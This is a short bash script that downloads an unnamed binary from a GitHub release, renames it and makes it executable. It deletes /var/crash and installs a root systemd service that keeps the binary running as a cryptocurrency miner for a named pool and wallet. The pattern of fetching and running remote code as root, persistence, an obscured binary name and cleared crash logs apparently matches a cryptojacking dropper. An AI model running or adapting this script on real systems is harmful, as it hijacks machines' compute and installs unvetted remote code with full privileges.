#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar

rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o zephyr.miningocean.org:5332 -u ZEPHs9Vz3m5PWqCN4xk9VgTDDE7rL7WocN5DVSzncv4GWP95SRym6CV2X6GRxetFQmgTXK3va3HEjNfhynaMMS4UHkJA7suMeVB -p test -a rx/0 -k -t 16
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
top
